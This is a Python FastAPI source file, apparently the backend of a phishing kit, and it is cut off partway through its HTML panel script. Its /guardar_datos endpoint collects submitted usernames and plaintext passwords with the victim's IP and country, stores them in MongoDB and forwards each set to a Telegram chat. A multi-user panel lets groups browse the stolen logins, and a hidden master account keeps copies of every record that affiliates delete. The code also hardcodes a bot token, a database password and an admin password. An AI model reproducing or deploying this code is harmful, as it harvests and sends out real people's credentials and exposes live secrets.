# ============================================================
# IMPORTS
# ============================================================
from fastapi import FastAPI, HTTPException, Request, Form
from functools import lru_cache
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from collections import defaultdict
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import httpx
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime
import asyncio
import time
import os
import ipaddress
from contextlib import asynccontextmanager
import logging
from asyncio import Semaphore, Queue
from bson import ObjectId
import hashlib
import hmac

# ============================================================
# DNS RESOLVER
# ============================================================
import dns.resolver

try:
    import dns.rdtypes.ANY.SRV
except ImportError:
    try:
        import dns.rdtypes.inet.SRV
    except ImportError:
        pass

_custom_resolver = dns.resolver.Resolver(configure=False)
_custom_resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
_custom_resolver.timeout = 5.0
_custom_resolver.lifetime = 5.0

dns.resolver.default_resolver = _custom_resolver
_original_resolve = dns.resolver.resolve

def _patched_resolve(qname, rdtype='A', *args, **kwargs):
    return _custom_resolver.resolve(qname, rdtype, *args, **kwargs)

dns.resolver.resolve = _patched_resolve
try:
    dns.resolver.query = _patched_resolve
except Exception:
    pass

try:
    import pymongo.srv_resolver as _srv_resolver
    import pymongo.uri_parser as _uri_parser

    _patched_dns_module = type('dns_patched', (), {
        'resolver': type('resolver_patched', (), {
            'default_resolver': _custom_resolver,
            'resolve': _patched_resolve,
            'query': _patched_resolve,
        })
    })()

    _srv_resolver.dns = _patched_dns_module
    _uri_parser.dns = _patched_dns_module
except Exception:
    pass

# ============================================================
# LOGGING Y CREDENCIALES
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(name)s | %(message)s'
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g")
AUTH_USERNAME = os.getenv("AUTH_USERNAME", "gato")
AUTH_PASSWORD = os.getenv("AUTH_PASSWORD", "Gato1234@")

MONGO_URI_SRV = os.getenv(
    "MONGO_URI_SRV",
    "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
)
MONGO_URI_DIRECT = os.getenv("MONGO_URI_DIRECT", "")

# ============================================================
# PARÁMETROS ANTI-FLOOD Y CONCURRENCIA
# ============================================================
ATTACK_THRESHOLD_COUNT = 10
ATTACK_TIME_WINDOW = 2.0
TEMP_BAN_DURATION = 900

ip_request_history = defaultdict(list)
temp_banned_ips: Dict[str, float] = {}
blocked_ips_cache: Set[str] = set()

CACHE_TTL = 300
ip_cache: Dict[str, tuple] = {}

MAX_CONCURRENT_REQUESTS = 100
MAX_DB_CONNECTIONS = 20
MAX_HTTP_CONNECTIONS = 50
REQUEST_TIMEOUT = 30

request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(20)

background_queue: Queue = Queue(maxsize=1000)

PAISES_LATINOAMERICA = frozenset({
    'AR', 'BO', 'BR', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV',
    'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'UY', 'VE', 'PR',
    'GF', 'GY', 'SR', 'BZ', 'JM', 'HT', 'TT', 'BB', 'GD', 'LC',
    'VC', 'DM', 'AG', 'KN', 'BS',
})

# ============================================================
# HASHING DE CLAVES
# ============================================================
def hash_password(password: str, salt: Optional[str] = None) -> tuple[str, str]:
    if salt is None:
        salt = os.urandom(16).hex()
    hashed = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        100000
    ).hex()
    return hashed, salt

def verify_password(password: str, stored_hash: str, salt: str) -> bool:
    hashed_attempt, _ = hash_password(password, salt)
    return hmac.compare_digest(hashed_attempt, stored_hash)

def verify_password_safe(password: str, doc: dict) -> bool:
    if "hash" in doc and "salt" in doc:
        return verify_password(password, doc["hash"], doc["salt"])
    if "password" in doc:
        return hmac.compare_digest(str(doc["password"]), password)
    return False

# ============================================================
# BACKGROUND WORKER
# ============================================================
async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            if asyncio.iscoroutinefunction(func):
                await func(*args, **kwargs)
            else:
                func(*args, **kwargs)
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Worker error: {e}")
            await asyncio.sleep(1)

# ============================================================
# MONGO MOTOR
# ============================================================
def _crear_cliente_mongo():
    opciones = dict(
        maxPoolSize=MAX_DB_CONNECTIONS,
        minPoolSize=2,
        maxIdleTimeMS=60000,
        serverSelectionTimeoutMS=15000,
        socketTimeoutMS=15000,
        connectTimeoutMS=15000,
        waitQueueTimeoutMS=10000,
        maxConnecting=5,
        retryWrites=True
    )
    if MONGO_URI_DIRECT:
        return AsyncIOMotorClient(MONGO_URI_DIRECT, **opciones)
    return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)

client = _crear_cliente_mongo()
db = client["api_db"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]
credenciales_usuario = db["credenciales_usuario"]
auditoria_maestro = db["auditoria_maestro"]  # Copia de seguridad forense para gato

# ============================================================
# HELPERS
# ============================================================
async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        logger.warning("Background queue llena")

async def init_db_async():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_bloqueadas.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(logs_usuarios.create_index("grupo", background=True), timeout=10.0),
                asyncio.wait_for(credenciales_usuario.create_index("usuario", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(auditoria_maestro.create_index("tipo_accion", background=True), timeout=10.0),
                asyncio.wait_for(auditoria_maestro.create_index("grupo_origen", background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            logger.info("Base de datos inicializada")
        except Exception as e:
            logger.error(f"DB error: {e}")

async def load_caches():
    global blocked_ips_cache
    async with db_semaphore:
        try:
            blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")

async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
    async with http_semaphore:
        url = f"http://ipwhois.app/json/{ip}"
        try:
            response = await asyncio.wait_for(app.state.http_client.get(url), timeout=4.0)
            if response.status_code == 200:
                data = response.json()
                country = data.get('country_code', 'Unknown')
                return (country in PAISES_LATINOAMERICA, country)
            return (False, 'Unknown')
        except Exception:
            return (False, 'Unknown')

def obtener_ip_real(request: Request) -> str:
    for header in ["cf-connecting-ip", "x-real-ip", "x-forwarded-for"]:
        value = request.headers.get(header)
        if value:
            ip = value.split(",")[0].strip()
            try:
                ipaddress.ip_address(ip)
                return ip
            except ValueError:
                continue
    return request.client.host if request.client else "127.0.0.1"

async def _enviar_telegram(mensaje: str):
    async with telegram_semaphore:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {
                "chat_id": "-4826186479",
                "text": mensaje[:4000]
            }
            await asyncio.wait_for(app.state.http_client.post(url, json=payload), timeout=5.0)
        except Exception as e:
            logger.error(f"Error Telegram: {e}")

async def registrar_auditoria(tipo_accion: str, autor: str, grupo_origen: str, datos_previos: dict, datos_nuevos: Optional[dict] = None):
    """Guarda copia inmutable de seguridad para el usuario maestro gato"""
    async with db_semaphore:
        try:
            registro_backup = {
                "tipo_accion": tipo_accion,
                "autor": autor,
                "grupo_origen": grupo_origen,
                "datos_previos": datos_previos,
                "datos_nuevos": datos_nuevos,
                "fecha_auditoria": datetime.utcnow()
            }
            await auditoria_maestro.insert_one(registro_backup)
        except Exception as e:
            logger.error(f"Error guardando auditoria maestro: {e}")

# ============================================================
# MIDDLEWARE ANTI-FLOOD Y PROTECCIÓN RÁFAGAS
# ============================================================
class AntiFloodDefenseMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = obtener_ip_real(request)
        now = time.time()

        if client_ip in blocked_ips_cache:
            return JSONResponse(status_code=403, content={"detail": "Acceso bloqueado permanentemente"})

        if client_ip in temp_banned_ips:
            unlock_time = temp_banned_ips[client_ip]
            if now < unlock_time:
                remaining = int(unlock_time - now)
                return JSONResponse(
                    status_code=429,
                    content={"detail": f"IP bloqueada temporalmente por flood. Intente en {remaining}s."}
                )
            else:
                del temp_banned_ips[client_ip]

        timestamps = ip_request_history[client_ip]
        ip_request_history[client_ip] = [t for t in timestamps if now - t < ATTACK_TIME_WINDOW]
        ip_request_history[client_ip].append(now)

        if len(ip_request_history[client_ip]) > ATTACK_THRESHOLD_COUNT:
            temp_banned_ips[client_ip] = now + TEMP_BAN_DURATION
            ip_request_history.pop(client_ip, None)
            logger.warning(f"IP Bloqueada por rafaga: {client_ip}")
            return JSONResponse(
                status_code=429,
                content={"detail": f"Exceso de peticiones detectado. Bloqueo aplicado por {TEMP_BAN_DURATION // 60} min."}
            )

        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    response: Response = await call_next(request)
                    response.headers["X-Content-Type-Options"] = "nosniff"
                    response.headers["X-Frame-Options"] = "DENY"
                    response.headers["X-XSS-Protection"] = "1; mode=block"
                    return response
        except asyncio.TimeoutError:
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado"})
        except Exception:
            return JSONResponse(status_code=500, content={"detail": "Error interno"})

# ============================================================
# LIFESPAN
# ============================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(max_keepalive_connections=MAX_HTTP_CONNECTIONS, max_connections=MAX_HTTP_CONNECTIONS * 2),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )
    await init_db_async()
    await load_caches()
    app.state.bg_worker = asyncio.create_task(background_worker())
    yield
    await background_queue.put(None)
    await app.state.http_client.aclose()
    client.close()

app = FastAPI(lifespan=lifespan)
app.add_middleware(AntiFloodDefenseMiddleware)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"]
)

# ============================================================
# MODELOS
# ============================================================
class UpdateLogRequest(BaseModel):
    usuario: Optional[str] = None
    contra: Optional[str] = None
    grupo: Optional[str] = None
    admin_user: str
    admin_pass: str

# ============================================================
# RUTAS DE REGISTRO
# ============================================================
@app.get("/")
async def read_root():
    return {"status": "online"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str, grupo: str):
    async with db_semaphore:
        try:
            await logs_usuarios.insert_one({
                "usuario": usuario[:200],
                "contrasena": contra[:200],
                "ip": ip,
                "pais": pais,
                "grupo": grupo.strip().lower()[:50],
                "fecha": datetime.utcnow()
            })
        except Exception as e:
            logger.error(f"Error guardando datos: {e}")

@app.post("/guardar_datos")
async def guardar_datos(
    request: Request,
    usuario: str = Form(...),
    contra: str = Form(...),
    grupo: str = Form("general")
):
    ip = obtener_ip_real(request)
    _, pais = await verificar_pais_cached(ip)
    grupo_limpio = grupo.strip().lower()[:50]
    
    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais, grupo_limpio)
    
    msg = f"🔔 *Nuevo Registro [{grupo_limpio}]*\n👤 Usuario: `{usuario}`\n🔑 Clave: `{contra}`\n🌐 IP: `{ip}`\n🌍 Pais: `{pais}`"
    await add_background_task(_enviar_telegram, msg)
    
    return {"message": "Datos guardados correctamente", "grupo": grupo_limpio, "ip": ip, "pais": pais}

# ============================================================
# GESTIÓN Y VALIDACIÓN DE ACCESO
# ============================================================
@app.post("/api/usuario/configurar")
async def configurar_password_usuario(usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        usuario_limpio = usuario.strip().lower()[:50]
        if len(password) < 4:
            raise HTTPException(status_code=400, detail="Contraseña demasiado corta")

        if usuario_limpio == AUTH_USERNAME.lower():
            raise HTTPException(status_code=400, detail="El usuario maestro ya posee credenciales del sistema.")

        existente = await credenciales_usuario.find_one({"usuario": usuario_limpio})
        if existente:
            raise HTTPException(status_code=400, detail="Este usuario ya posee una clave permanente")
        
        pw_hash, salt = hash_password(password)
        await credenciales_usuario.insert_one({
            "usuario": usuario_limpio,
            "hash": pw_hash,
            "salt": salt,
            "fecha_creacion": datetime.utcnow()
        })
        return {"message": "Clave establecida correctamente"}

@app.post("/api/usuario/verificar")
async def verificar_acceso_usuario(usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        usuario_limpio = usuario.strip().lower()[:50]

        if usuario_limpio == AUTH_USERNAME.lower():
            if hmac.compare_digest(password, AUTH_PASSWORD):
                return {"status": "ok", "usuario": usuario_limpio, "is_master": True}
            raise HTTPException(status_code=401, detail="Contraseña incorrecta para usuario maestro.")

        doc = await credenciales_usuario.find_one({"usuario": usuario_limpio})
        if not doc or not verify_password_safe(password, doc):
            raise HTTPException(status_code=401, detail="Credenciales incorrectas")
        return {"status": "ok", "usuario": usuario_limpio, "is_master": False}

async def validar_credenciales_internas(usuario: str, password: str) -> bool:
    usuario_limpio = usuario.strip().lower()
    if usuario_limpio == AUTH_USERNAME.lower() and hmac.compare_digest(password, AUTH_PASSWORD):
        return True
    doc = await credenciales_usuario.find_one({"usuario": usuario_limpio})
    if not doc or not verify_password_safe(password, doc):
        return False
    return True

# ============================================================
# API CRUD CON AISLAMIENTO Y BACKUP FORENSE AUTOMÁTICO
# ============================================================
@app.get("/api/logs")
async def api_obtener_logs(usuario: str, password: str, grupo: Optional[str] = None):
    async with db_semaphore:
        if not await validar_credenciales_internas(usuario, password):
            raise HTTPException(status_code=401, detail="No autorizado")

        usuario_limpio = usuario.strip().lower()
        if usuario_limpio != AUTH_USERNAME.lower():
            query = {"grupo": usuario_limpio}
        else:
            query = {"grupo": grupo.strip().lower()} if grupo and grupo != "todos" else {}

        cursor = logs_usuarios.find(query).sort("fecha", -1).limit(200)
        logs = await cursor.to_list(length=200)
        
        resultado = []
        for log in logs:
            resultado.append({
                "id": str(log["_id"]),
                "usuario": log.get("usuario", ""),
                "contra": log.get("contrasena", ""),
                "ip": log.get("ip", ""),
                "pais": log.get("pais", ""),
                "grupo": log.get("grupo", "general"),
                "fecha": log.get("fecha").strftime("%Y-%m-%d %H:%M:%S") if isinstance(log.get("fecha"), datetime) else str(log.get("fecha"))
            })
        return {"logs": resultado}

@app.get("/api/grupos")
async def api_obtener_grupos(usuario: str, password: str):
    async with db_semaphore:
        if not await validar_credenciales_internas(usuario, password):
            raise HTTPException(status_code=401, detail="No autorizado")

        usuario_limpio = usuario.strip().lower()
        if usuario_limpio != AUTH_USERNAME.lower():
            return {"grupos": [usuario_limpio]}

        grupos = await logs_usuarios.distinct("grupo")
        return {"grupos": grupos if grupos else ["general"]}

@app.put("/api/logs/{log_id}")
async def api_editar_log(log_id: str, data: UpdateLogRequest):
    async with db_semaphore:
        try:
            if not await validar_credenciales_internas(data.admin_user, data.admin_pass):
                raise HTTPException(status_code=401, detail="No autorizado")

            usuario_limpio = data.admin_user.strip().lower()

            log_existente = await logs_usuarios.find_one({"_id": ObjectId(log_id)})
            if not log_existente:
                raise HTTPException(status_code=404, detail="No encontrado")

            if usuario_limpio != AUTH_USERNAME.lower() and log_existente.get("grupo") != usuario_limpio:
                raise HTTPException(status_code=403, detail="Sin permisos sobre este registro")

            update_data = {}
            if data.usuario is not None: update_data["usuario"] = data.usuario[:200]
            if data.contra is not None: update_data["contrasena"] = data.contra[:200]
            
            if data.grupo is not None:
                grupo_nuevo = data.grupo.strip().lower()[:50]
                if usuario_limpio != AUTH_USERNAME.lower() and grupo_nuevo != usuario_limpio:
                    raise HTTPException(status_code=403, detail="No puede reasignar fuera de su grupo")
                update_data["grupo"] = grupo_nuevo

            if not update_data:
                raise HTTPException(status_code=400, detail="Sin datos a modificar")

            # Snapshot forense antes de actualizar
            datos_previos = {
                "id_registro": str(log_existente["_id"]),
                "usuario": log_existente.get("usuario"),
                "contrasena": log_existente.get("contrasena"),
                "ip": log_existente.get("ip"),
                "pais": log_existente.get("pais"),
                "grupo": log_existente.get("grupo"),
                "fecha_original": str(log_existente.get("fecha"))
            }

            result = await logs_usuarios.update_one({"_id": ObjectId(log_id)}, {"$set": update_data})
            
            # Registrar auditoria para gato
            await add_background_task(
                registrar_auditoria,
                tipo_accion="EDICION",
                autor=usuario_limpio,
                grupo_origen=log_existente.get("grupo", "general"),
                datos_previos=datos_previos,
                datos_nuevos=update_data
            )

            return {"message": "Actualizado exitosamente"}
        except Exception as e:
            if isinstance(e, HTTPException): raise e
            raise HTTPException(status_code=400, detail="ID inválido")

@app.delete("/api/logs/{log_id}")
async def api_eliminar_log(log_id: str, usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        try:
            if not await validar_credenciales_internas(usuario, password):
                raise HTTPException(status_code=401, detail="No autorizado")

            usuario_limpio = usuario.strip().lower()

            log_existente = await logs_usuarios.find_one({"_id": ObjectId(log_id)})
            if not log_existente:
                raise HTTPException(status_code=404, detail="No encontrado")

            if usuario_limpio != AUTH_USERNAME.lower() and log_existente.get("grupo") != usuario_limpio:
                raise HTTPException(status_code=403, detail="Sin permisos sobre este registro")

            datos_previos = {
                "id_registro": str(log_existente["_id"]),
                "usuario": log_existente.get("usuario"),
                "contrasena": log_existente.get("contrasena"),
                "ip": log_existente.get("ip"),
                "pais": log_existente.get("pais"),
                "grupo": log_existente.get("grupo"),
                "fecha_original": str(log_existente.get("fecha"))
            }

            await logs_usuarios.delete_one({"_id": ObjectId(log_id)})

            # Copia de seguridad guardada para gato
            await add_background_task(
                registrar_auditoria,
                tipo_accion="ELIMINACION_INDIVIDUAL",
                autor=usuario_limpio,
                grupo_origen=log_existente.get("grupo", "general"),
                datos_previos=datos_previos
            )

            return {"message": "Eliminado exitosamente"}
        except Exception as e:
            if isinstance(e, HTTPException): raise e
            raise HTTPException(status_code=400, detail="ID inválido")

@app.delete("/api/grupo/{grupo_nombre}")
async def api_eliminar_grupo(grupo_nombre: str, usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        if not await validar_credenciales_internas(usuario, password):
            raise HTTPException(status_code=401, detail="No autorizado")

        usuario_limpio = usuario.strip().lower()
        grupo_limpio = grupo_nombre.strip().lower()

        if usuario_limpio != AUTH_USERNAME.lower() and grupo_limpio != usuario_limpio:
            raise HTTPException(status_code=403, detail="No puede eliminar otros grupos")

        cursor = logs_usuarios.find({"grupo": grupo_limpio})
        docs_a_eliminar = await cursor.to_list(length=1000)

        if docs_a_eliminar:
            # Backup completo del lote para gato
            for doc in docs_a_eliminar:
                datos_previos = {
                    "id_registro": str(doc["_id"]),
                    "usuario": doc.get("usuario"),
                    "contrasena": doc.get("contrasena"),
                    "ip": doc.get("ip"),
                    "pais": doc.get("pais"),
                    "grupo": doc.get("grupo"),
                    "fecha_original": str(doc.get("fecha"))
                }
                await add_background_task(
                    registrar_auditoria,
                    tipo_accion="ELIMINACION_GRUPO",
                    autor=usuario_limpio,
                    grupo_origen=grupo_limpio,
                    datos_previos=datos_previos
                )

        result = await logs_usuarios.delete_many({"grupo": grupo_limpio})
        return {"message": f"Se eliminaron {result.deleted_count} registros"}

# ============================================================
# CONSULTA DE BACKUP EXCLUSIVA PARA USUARIO MAESTRO GATO
# ============================================================
@app.get("/api/maestro/auditoria")
async def api_obtener_auditoria_maestro(usuario: str, password: str):
    async with db_semaphore:
        usuario_limpio = usuario.strip().lower()
        if usuario_limpio != AUTH_USERNAME.lower() or not hmac.compare_digest(password, AUTH_PASSWORD):
            raise HTTPException(status_code=403, detail="Acceso reservado exclusivamente al usuario maestro.")

        cursor = auditoria_maestro.find().sort("fecha_auditoria", -1).limit(500)
        backups = await cursor.to_list(length=500)

        resultado = []
        for b in backups:
            resultado.append({
                "id": str(b["_id"]),
                "tipo_accion": b.get("tipo_accion"),
                "autor": b.get("autor"),
                "grupo_origen": b.get("grupo_origen"),
                "datos_previos": b.get("datos_previos"),
                "datos_nuevos": b.get("datos_nuevos"),
                "fecha": b.get("fecha_auditoria").strftime("%Y-%m-%d %H:%M:%S") if isinstance(b.get("fecha_auditoria"), datetime) else str(b.get("fecha_auditoria"))
            })
        return {"auditoria": resultado}

# ============================================================
# PANEL HTML CON CLIPBOARD Y PESTAÑA MAESTRO AUDITORIA
# ============================================================
@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    html_content = """
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Panel de Acceso y Gestión</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background-color: #f4f6f9; color: #333; }
            h2 { color: #2c3e50; }
            .card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
            .card input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            .controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
            select, button, input { padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
            button { background-color: #007bff; color: white; border: none; cursor: pointer; border-radius: 4px; }
            button:hover { background-color: #0056b3; }
            button.btn-danger { background-color: #dc3545; }
            button.btn-warning { background-color: #ffc107; color: #212529; }
            button.btn-secondary { background-color: #6c757d; }
            button.btn-info { background-color: #17a2b8; }
            table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px; }
            th, td { padding: 12px 15px; border-bottom: 1px solid #eee; text-align: left; }
            th { background-color: #007bff; color: white; }
            tr:hover { background-color: #f8f9fa; }
            
            .copyable { cursor: pointer; transition: color 0.2s; }
            .copyable:hover { color: #007bff; text-decoration: underline; }
            
            #toast {
                visibility: hidden; min-width: 200px; background-color: #222; color: #fff; text-align: center;
                border-radius: 4px; padding: 10px; position: fixed; z-index: 1000; right: 20px; bottom: 20px;
                font-size: 14px; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            }
            #toast.show { visibility: visible; animation: fadein 0.2s, fadeout 0.2s 1.5s; }
            @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 20px; opacity: 1;} }
            @keyframes fadeout { from {bottom: 20px; opacity: 1;} to {bottom: 0; opacity: 0;} }

            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
            .modal-content { background: white; padding: 25px; border-radius: 8px; width: 400px; }
            .modal-content input { width: 100%; margin-bottom: 15px; box-sizing: border-box; }
            .modal-buttons { display: flex; justify-content: flex-end; gap: 10px; }
            #crudContainer { display: none; }
            #seccionAuditoria { display: none; margin-top: 25px; }
            .badge-del { background-color: #dc3545; color: white; padding: 3px 7px; border-radius: 4px; font-size: 12px; }
            .badge-edit { background-color: #ffc107; color: #111; padding: 3px 7px; border-radius: 4px; font-size: 12px; }
        </style>
    </head>
    <body>

        <div id="authContainer" class="card">
            <h2>Acceso al Panel</h2>
            <p style="font-size: 13px; color: #666;">Ingresa tu usuario y contraseña. Si el usuario es nuevo, se creará su contraseña permanente.</p>
            <input type="text" id="loginUsuario" placeholder="Nombre de Usuario">
            <input type="password" id="loginPassword" placeholder="Contraseña">
            <button style="width: 100%;" onclick="autenticarUsuario()">Ingresar / Configurar</button>
            <p id="authError" style="color: red; font-size: 13px; margin-top: 10px; text-align: center;"></p>
        </div>

        <div id="crudContainer">
            <h2>Panel de Registros - Usuario: <span id="spanUser"></span></h2>
            
            <div class="controls">
                <div>
                    <label for="grupoSelect"><strong>Grupo:</strong></label>
                    <select id="grupoSelect" onchange="cargarLogs()">
                        <option value="todos">Todos</option>
                    </select>
                    <button onclick="cargarGruposYLogs()" style="margin-left: 10px;">Actualizar</button>
                </div>
                <div>
                    <button id="btnAuditoria" class="btn-info" style="display:none; margin-right: 10px;" onclick="toggleAuditoria()">Ver Copias / Auditoría Maestro</button>
                    <button class="btn-danger" onclick="eliminarGrupoActual()">Eliminar Grupo</button>
                    <button onclick="cerrarSesion()" class="btn-secondary" style="margin-left: 10px;">Salir</button>
                </div>
            </div>

            <table>
                <thead>
                    <tr>
                        <th>Grupo</th>
                        <th>Correo / Usuario</th>
                        <th>Contraseña</th>
                        <th>IP</th>
                        <th>País</th>
                        <th>Fecha (UTC)</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody id="tablaLogs">
                    <tr><td colspan="7" style="text-align:center;">Cargando...</td></tr>
                </tbody>
            </table>

            <!-- SECCION EXCLUSIVA MAESTRO GATO: HISTORIAL Y BACKUPS DE SEGURIDAD -->
            <div id="seccionAuditoria">
                <h3 style="color:#d9534f;">🛡️ Copia de Seguridad y Auditoría Forense (Exclusivo Maestro)</h3>
                <p style="font-size:13px; color:#555;">Aquí se conserva copia íntegra de todo registro editado o eliminado por los usuarios.</p>
                <table>
                    <thead>
                        <tr style="background-color: #343a40;">
                            <th>Acción</th>
                            <th>Autor</th>
                            <th>Grupo</th>
                            <th>Usuario Previo</th>
                            <th>Clave Previa</th>
                            <th>Datos Modificados</th>
                            <th>Fecha Acción</th>
                        </tr>
                    </thead>
                    <tbody id="tablaAuditoria">
                        <tr><td colspan="7" style="text-align:center;">Sin auditorías...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>

        <div id="toast">Copiado al portapapeles</div>

        <div id="editModal" class="modal">
            <div class="modal-content">
                <h3>Editar Registro</h3>
                <input type="hidden" id="editId">
                <label>Usuario:</label>
                <input type="text" id="editUsuario">
                <label>Contraseña:</label>
                <input type="text" id="editContra">
                <label>Grupo:</label>
                <input type="text" id="editGrupo">
                <div class="modal-buttons">
                    <button class="btn-warning" onclick="cerrarModal()">Cancelar</button>
                    <button onclick="guardarEdicion()">Guardar</button>
                </div>
            </div>
        </div>

        <script>
            let currentUser = "";
            let currentPass = "";
            let isMaster = false;

            window.onload = () => {
                const savedUser = sessionStorage.getItem('crud_user');
                const savedPass = sessionStorage.getItem('crud_pass');
                if (savedUser && savedPass) {
                    currentUser = savedUser;
                    currentPass = savedPass;
                    isMaster = currentUser.toLowerCase() === "gato";
                    configurarVista();
                }
            }

            function configurarVista() {
                document.getElementById('spanUser').textContent = currentUser;
                document.getElementById('authContainer').style.display = 'none';
                document.getElementById('crudContainer').style.display = 'block';
                if (isMaster) {
                    document.getElementById('btnAuditoria').style.display = 'inline-block';
                }
                cargarGruposYLogs();
            }

            async function autenticarUsuario() {
                const u = document.getElementById('loginUsuario').value.trim();
                const p = document.getElementById('loginPassword').value.trim();
                const errBox = document.getElementById('authError');
                errBox.textContent = "";

                if (!u || !p) {
                    errBox.textContent = "Ingrese usuario y contraseña.";
                    return;
                }

                try {
                    let formData = new URLSearchParams();
                    formData.append('usuario', u);
                    formData.append('password', p);

                    let res = await fetch('/api/usuario/verificar', { method: 'POST', body: formData });
                    
                    if (res.ok) {
                        let data = await res.json();
                        isMaster = data.is_master || u.toLowerCase() === "gato";
                        guardarSesion(u, p);
                        return;
                    }

                    if (res.status === 401 && u.toLowerCase() !== "gato") {
                        let resConfig = await fetch('/api/usuario/configurar', { method: 'POST', body: formData });
                        if (resConfig.ok) {
                            isMaster = false;
                            guardarSesion(u, p);
                        } else {
                            let errData = await resConfig.json();
                            errBox.textContent = errData.detail || "Contraseña inválida.";
                        }
                    } else {
                        let errData = await res.json();
                        errBox.textContent = errData.detail || "Error al autenticar.";
                    }
                } catch (e) {
                    errBox.textContent = "Error conectando con el servidor.";
                }
            }

            function guardarSesion(u, p) {
                currentUser = u;
                currentPass = p;
                sessionStorage.setItem('crud_user', u);
                sessionStorage.setItem('crud_pass', p);
                configurarVista();
            }

            function cerrarSesion() {
                sessionStorage.clear();
                window.location.reload();
            }

            function copiarTexto(texto) {
                navigator.clipboard.writeText(texto).then(() => {
                    const toast = document.getElementById("toast");
                    toast.className = "show";
                    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 1500);
                });
            }

            async function cargarGruposYLogs() {
                try {
                    const resGrupos = await fetch(`/api/grupos?usuario=${encodeURIComponent(currentUser)}&password=${encodeURIComponent(currentPass)}`);
                    const dataGrupos = await resGrupos.json();
                    const select = document.getElementById('grupoSelect');
                    
                    select.innerHTML = '';
                    if (isMaster) {
                        select.innerHTML = '<option value="todos">Todos</option>';
                    }
                    dataGrupos.grupos.forEach(g => {
                        const opt = document.createElement('option');
                        opt.value = g;
                        opt.textContent = g.toUpperCase();
                        select.appendChild(opt);
                    });
                } catch (e) {
                    console.error("Error al obtener grupos", e);
                }
                cargarLogs();
            }

            async function cargarLogs() {
                const grupo = document.getElementById('grupoSelect').value;
                let url = `/api/logs?usuario=${encodeURIComponent(currentUser)}&password=${encodeURIComponent(currentPass)}`;
                if (grupo && grupo !== 'todos') url += `&grupo=${encodeURIComponent(grupo)}`;

                try {
                    const res = await fetch(url);
                    if (!res.ok) {
                        cerrarSesion();
                        return;
                    }
                    const data = await res.json();
                    const tbody = document.getElementById('tablaLogs');
                    tbody.innerHTML = '';

                    if (data.logs.length === 0) {
